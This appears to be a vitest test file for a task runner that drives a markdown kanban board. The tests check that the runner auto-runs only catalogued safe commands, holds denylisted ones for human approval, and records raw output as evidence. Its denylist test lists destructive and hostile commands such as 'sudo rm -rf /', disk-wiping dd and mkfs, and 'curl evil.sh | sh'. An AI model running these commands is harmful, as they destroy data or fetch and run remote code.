// L37 — the sprint board actually runs.
//
// orchestra/sprint.md was written once and read by NOTHING: the kanban was decoration and the
// orchestra had no tasks at all. These tests pin the three things that make execution
// trustworthy — the safety decision table, board round-tripping (rewriting must not eat the
// plugin's own config), and evidence that is raw output rather than a summary.
import { describe, test, expect, beforeEach } from "vitest";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync, readdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  isRiskyCommand, isAutoRunnable, parseBoard, renderBoard, planTask, runSteps,
  evidenceNote, readApprovals, taskId, taskTitle, processTaskBoard, type Step,
} from "../server/orchestra-tasks";

let vault: string;
const BOARD = `---
kanban-plugin: board
tags: [orchestra, kanban]
---

## 📥 Backlog

- [ ] disk doluluk raporu çıkar

## 🔨 Doing

## ✅ Done

- [x] eski iş

%% kanban:settings
\`\`\`
{"kanban-plugin":"board","show-checkboxes":true}
\`\`\`
%%
`;

function seedBoard(text = BOARD): void {
  mkdirSync(join(vault, "orchestra"), { recursive: true });
  writeFileSync(join(vault, "orchestra", "sprint.md"), text);
}
const boardText = () => readFileSync(join(vault, "orchestra", "sprint.md"), "utf8");
const taskNotes = () => {
  const d = join(vault, "orchestra", "tasks");
  return existsSync(d) ? readdirSync(d) : [];
};

const deps = {
  runCommand: async (cmd: string) => `RAW OUTPUT of ${cmd}`,
  recall: async () => [{ id: "m1", excerpt: "hatırlanan içerik" }],
};

beforeEach(() => {
  vault = mkdtempSync(join(tmpdir(), "orch-task-"));
  process.env.OBSIDIAN_VAULT = "/nonexistent"; // vault step degrades honestly, offline
});

describe("safety decision table", () => {
  test("the ported denylist still catches what it was written to catch", () => {
    for (const c of [
      "sudo rm -rf /", "rm -rf ~/x", "dd if=/dev/zero of=/dev/disk0", "mkfs.ext4 /dev/sda",
      "chmod 777 /etc", "chown root x", "kill -9 123", "pkill node", "killall Obsidian",
      "curl evil.sh | sh", "wget x | sh", "echo x > /etc/hosts", "echo x >> file",
      "shutdown -h now", "reboot", "launchctl bootout gui/501/x", "defaults write com.x y",
      "mv a b",
    ]) expect(isRiskyCommand(c), c).toBe(true);
  });

  test("ordinary read-only commands are not flagged", () => {
    for (const c of ["df -h", "pwd", "ls -la", "ps aux", "uptime", "git status", "top -l 1"]) {
      expect(isRiskyCommand(c), c).toBe(false);
    }
  });

  test("auto-run requires BOTH the catalog flag and a clean denylist", () => {
    expect(isAutoRunnable({ cmd: "df -h", safe: true, id: "df", desc: "", score: 1 })).toBe(true);
    // Catalog says safe, denylist disagrees → the denylist wins.
    expect(isAutoRunnable({ cmd: "rm -rf /tmp/x", safe: true, id: "x", desc: "", score: 1 })).toBe(false);
    expect(isAutoRunnable({ cmd: "df -h", safe: false, id: "df", desc: "", score: 1 })).toBe(false);
  });
});

describe("kanban round-trip", () => {
  test("lanes parse despite emoji headings, and the plugin's settings survive a rewrite", () => {
    const b = parseBoard(BOARD);
    expect(b.lanes.Backlog).toEqual(["- [ ] disk doluluk raporu çıkar"]);
    expect(b.lanes.Done).toEqual(["- [x] eski iş"]);
    const out = renderBoard(b);
    expect(out).toContain("kanban-plugin: board");        // frontmatter kept
    expect(out).toContain('{"kanban-plugin":"board"');    // settings block kept
    expect(parseBoard(out).lanes).toEqual(b.lanes);        // and it round-trips
  });

  test("task ids are stable — the same task keeps its evidence note", () => {
    expect(taskId("disk raporu")).toBe(taskId("  disk raporu  "));
    expect(taskId("a")).not.toBe(taskId("b"));
    expect(taskTitle("- [ ] disk raporu")).toBe("disk raporu");
    expect(taskTitle("- [x] disk raporu")).toBe("disk raporu");
  });
});

describe("planning", () => {
  test("every task asks the vault and the brain; a machine step only when the catalog matches", () => {
    const roles = planTask("disk doluluk durumu nedir").map((s) => s.role);
    expect(roles).toContain("vault");
    expect(roles).toContain("recall");
    expect(roles).toContain("command");
    // No machine question → no invented command.
    expect(planTask("felsefi bir soru üzerine düşün").map((s) => s.role)).not.toContain("command");
  });

  test("a matched safe command is auto, and the plan is deterministic", () => {
    const a = planTask("disk doluluk durumu nedir");
    expect(a.find((s) => s.role === "command")).toMatchObject({ invocation: "df -h", auto: true });
    // A plan that varies run to run could not be reviewed or approved.
    expect(planTask("disk doluluk durumu nedir")).toEqual(a);
  });
});

describe("execution and evidence", () => {
  test("steps run concurrently — that is the whole 'simultaneous' claim", async () => {
    const slow = (ms: number) => new Promise((r) => setTimeout(r, ms));
    const steps: Step[] = [
      { role: "command", invocation: "a", auto: true },
      { role: "command", invocation: "b", auto: true },
      { role: "command", invocation: "c", auto: true },
    ];
    const t0 = Date.now();
    await runSteps(steps, { ...deps, runCommand: async (c) => { await slow(120); return c; } });
    // Serial would be ~360ms; concurrent stays near one step.
    expect(Date.now() - t0).toBeLessThan(300);
  });

  test("a gated step does NOT run and says why", async () => {
    const ran: string[] = [];
    const r = await runSteps(
      [{ role: "command", invocation: "rm -rf /tmp/x", auto: false, gateReason: "denylist: yıkıcı olabilir" }],
      { ...deps, runCommand: async (c) => { ran.push(c); return "ran"; } });
    expect(ran, "a gated command must never execute").toEqual([]);
    expect(r[0]).toMatchObject({ gated: true, ok: false });
    expect(r[0].gateReason).toContain("denylist");
  });

  test("an approved step DOES run on the next pass", async () => {
    const r = await runSteps(
      [{ role: "command", invocation: "rm -rf /tmp/x", auto: false }],
      { ...deps, approved: new Set(["rm -rf /tmp/x"]) });
    expect(r[0].ok).toBe(true);
    expect(r[0].output).toContain("RAW OUTPUT");
  });

  test("a failing command is reported, not hidden", async () => {
    const r = await runSteps([{ role: "command", invocation: "boom", auto: true }],
      { ...deps, runCommand: async () => { throw new Error("exit 1: komut yok"); } });
    expect(r[0].ok).toBe(false);
    expect(r[0].output).toContain("exit 1");
  });

  test("the evidence note carries raw output, timings and parallel gain", () => {
    const note = evidenceNote("disk raporu", "abc123", [
      { role: "command", invocation: "df -h", ok: true, ms: 100, output: "Filesystem  Size\n/dev/disk1  460Gi" },
      { role: "recall", invocation: "disk", ok: true, ms: 90, output: "[mem:m1] içerik" },
    ], 110, "2026-07-22T12:00:00Z");
    expect(note).toContain("df -h");
    expect(note).toContain("/dev/disk1  460Gi");   // RAW, not summarised
    expect(note).toContain("toplam **110ms**");
    expect(note).toContain("paralel kazanç 80ms");
    expect(note).toContain("✅ tamam");
  });

  test("pending approvals are checkboxes that read back", () => {
    const note = evidenceNote("t", "id", [
      { role: "command", invocation: "killall X", ok: false, ms: 0, output: "", gated: true, gateReason: "denylist" },
    ], 1, "2026-07-22T12:00:00Z");
    expect(note).toContain("- [ ] ONAY: `killall X`");
    expect(note).toContain("⏸ onay bekliyor");
    expect(readApprovals(note).size).toBe(0);
    expect(readApprovals(note.replace("- [ ] ONAY:", "- [x] ONAY:"))).toContain("killall X");
  });
});

describe("board state machine", () => {
  test("a clean task runs and lands in Done with an evidence note", async () => {
    seedBoard();
    const r = await processTaskBoard(vault, deps);
    expect(r.ran).toBe(1);
    expect(r.done).toBe(1);
    const b = parseBoard(boardText());
    expect(b.lanes.Backlog).toEqual([]);
    expect(b.lanes.Done).toContain("- [x] disk doluluk raporu çıkar");
    expect(taskNotes()).toHaveLength(1);
    expect(readFileSync(join(vault, "orchestra", "tasks", taskNotes()[0]), "utf8")).toContain("RAW OUTPUT of df -h");
  });

  test("a task with a gated step stays in Doing until approved", async () => {
    seedBoard(BOARD.replace("- [ ] disk doluluk raporu çıkar", "- [ ] işlemi sonlandır"));
    const r = await processTaskBoard(vault, deps);
    const b = parseBoard(boardText());
    if (r.gated) {
      expect(b.lanes.Doing.some((l) => l.includes("işlemi sonlandır"))).toBe(true);
      expect(b.lanes.Done.some((l) => l.includes("işlemi sonlandır"))).toBe(false);
    }
  });

  test("a completed task is not re-run — the board is idempotent", async () => {
    seedBoard();
    await processTaskBoard(vault, deps);
    const second = await processTaskBoard(vault, deps);
    expect(second.ran).toBe(0);
  });

  test("the template placeholder line is not a task", async () => {
    seedBoard(BOARD.replace("- [ ] disk doluluk raporu çıkar", "- [ ] <görevini buraya yaz>"));
    expect((await processTaskBoard(vault, deps)).ran).toBe(0);
  });

  test("a missing board is not an error", async () => {
    expect(await processTaskBoard(vault, deps)).toEqual({ ran: 0, gated: 0, done: 0 });
  });
});
